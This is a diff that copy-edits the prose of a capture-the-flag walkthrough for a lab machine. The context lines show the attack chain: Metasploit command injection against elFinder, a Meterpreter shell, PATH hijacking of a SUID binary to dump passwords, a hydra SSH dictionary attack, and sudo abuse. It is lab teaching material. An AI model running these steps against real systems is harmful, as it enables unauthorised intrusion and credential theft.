@@ -196,7 +196,7 @@ msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run
 meterpreter > 
 ```
 
-We can now spawn a shell on the target system using the meterpreter's "shell" command.
+We can now spawn a shell on the target system using Meterpreter's shell command.
 
 ```
 meterpreter > shell
@@ -204,13 +204,13 @@ Process 4127 created.
 Channel 0 created.
 ```
 
-Next we upgrade our spawned shell.
+Next we upgrade our spawned shell:
 
 ```
 python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
 
-We can see that we cannot open user.txt file with the flag yet, but we spotted .passwords file in "think" user's home directory.
+We see that we cannot open the user.txt flag file yet, but we spotted a .passwords file in the think user's home directory.
 
 ```
 <var/www/files.lookup.thm/public_html/elFinder/php$ cd /home
@@ -236,7 +236,7 @@ cat: .passwords: Permission denied
 www-data@ip-10-113-167-167:/home/think$ 
 ```
 
-After searching for binaries with the SETUID set, we encounter suspicious "pwm" binary.
+After searching for binaries with the SUID bit set, we encounter a suspicious pwm binary.
 
 ```
 www-data@ip-10-113-167-167:/home/think$ find / -perm -u=s -type f 2>/dev/null
@@ -288,7 +288,7 @@ pwm
 [-] File /home/www-data/.passwords not found
 ```
 
-We can see that pwm binary uses "id" binary during it's execution, and it's trying to read .passwords file from user's home directory. We can abuse that, by creating our own "id", and prepending it's location to the $PATH environmental variable.
+We can see that the pwm binary calls the id command during its execution, and it attempts to read the .passwords file from the user's home directory. We can abuse this behavior by creating our own malicious id script and prepending its location to the $PATH environment variable.
 
 ```
 www-data@ip-10-113-167-167:/home/think$ echo '#!/bin/bash' > /tmp/id
@@ -300,7 +300,7 @@ www-data@ip-10-113-167-167:/home/think$ chmod +x /tmp/id
 www-data@ip-10-113-167-167:/home/think$ export PATH=/tmp:$PATH
 ```
 
-Now we can use "pwm" command again, and we get a list of passwords.
+Now we can run the pwm command again, which successfully returns a list of passwords.
 
 ```
 www-data@ip-10-113-167-167:/home/think$ pwm
@@ -358,7 +358,7 @@ jose.9298
 jose.2856171
 ```
 
-Once we have our passwords list we can try launching an dictionary attack against the think user over the SSH:
+Once we have our password list, we can try launching a dictionary attack against the think user over SSH:
 
 ```
 hydra -l think -P passwords.txt ssh://lookup.thm
@@ -431,7 +431,7 @@ think@ip-10-113-167-167:~$ cat user.txt
 38375fb4dd8baa2b2039ac03d92b820e
 ```
 
-Now we want to read the root.txt flag. We can see that we are able to execute "look" command with the root priviliges. That's how we can access root.txt file:
+Now we want to read the root.txt flag. We can see that we are allowed to execute the look command with root privileges. This is how we can access the root.txt file:
 
 ```
 think@ip-10-113-167-167:/$ sudo -l
